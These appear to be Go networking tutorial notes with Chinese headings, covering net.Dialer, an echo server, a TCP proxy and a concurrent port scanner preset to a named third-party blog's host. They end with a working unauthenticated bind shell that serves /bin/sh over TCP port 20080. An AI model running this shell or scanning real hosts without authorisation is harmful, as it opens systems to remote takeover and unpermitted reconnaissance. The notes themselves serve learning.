net.Dialer

// Dialer表示一个拨号器，用于客户端发起连接
type Dialer struct {
	Timeout time.Duration
	Deadline time.Time
	LocalAddr Addr
	DualStack bool
	FallbackDelay time.Duration
	KeepAlive time.Duration
	Resolver *Resolver
	Cancel <-chan struct{}
	Control func(network, address string, c syscall.RawConn) error
}

// 初始化拨号器
var d net.Dialer
// 发起conn
func (d *Dialer) Dial(network, address string) (Conn, error) {}

// 初始化并发起连接
func Dial(network, address string) (Conn, error) {
	var d Dialer
	return d.Dial(network, address)
}

端口扫描器

package main

import (
	"fmt"
	"net"
	"runtime"
	"sync"
	"time"
)

var wg sync.WaitGroup		// 同步子协程
var MaxCur = 1000			// 设置最大并发数，控制扫描速度
var ch = make(chan bool, MaxCur)
var Host = "blog.fatedier.com"	// 主机名
var MinPort = 0
var MaxPort = 10000			// 设置端口范围，最大值：65535
var Timeout int64 = 3		// 设置单个扫描超时

func main() {
	start := time.Now()
	fmt.Printf("预计耗时：%ds\n", 3*(MaxPort-MinPort)/MaxCur)

	for i:=MinPort;i<=MaxPort;i++{
		wg.Add(1)
		ch <- true
		if i!=0 && i%1000 == 0 {
			fmt.Printf("scan port %d goroutines:%d\n", i, runtime.NumGoroutine())
		}
		go func(i int) {
			defer wg.Done()
			addr := fmt.Sprintf("%s:%d", Host,i)
			c,err := net.DialTimeout("tcp", addr, time.Duration(Timeout) * time.Second)
			if err == nil {
				fmt.Printf("port %d is open!\n", i)
				c.Close()
			}
			<-ch
		}(i)
	}
	wg.Wait()

	end := time.Since(start)
	fmt.Println("耗时：", end)
}

回显服务器

package main

import (
	"io"
	"log"
	"net"
)

func echo(conn net.Conn)  {
	defer conn.Close()
	if _,err := io.Copy(conn, conn); err != nil {
		log.Fatalln("Unable to read/write data")
	}
}

func main() {
	l, err := net.Listen("tcp", ":8888")
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Listening on 0.0.0.0:8888")
	for {
		conn,err := l.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		log.Println("Received connection")
		go echo(conn)
	}
}

TCP端口转发（TCP代理）

将访问0.0.0.0:8889的所有流量，转发到blog.youthsweet.com:80

package main

import (
	"io"
	"log"
	"net"
)

func main() {
	l, err := net.Listen("tcp", ":8889")
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Listening on 0.0.0.0:8889")
	for {
		conn,err := l.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		log.Println("Received connection")
		go echo(conn)
	}
}

func echo(src net.Conn)  {
	defer src.Close()

	dst,err := net.Dial("tcp", "blog.youthsweet.com:80")
	if err != nil {
		log.Fatalln("Unable to connect dst")
	}
	defer dst.Close()

	go func() {
		if _,err := io.Copy(dst, src); err != nil {
			log.Fatalln(err)
		}
	}()

	if _,err := io.Copy(src, dst); err != nil {
		log.Fatalln(err)
	}
}

package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {

	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */
	// cmd := exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
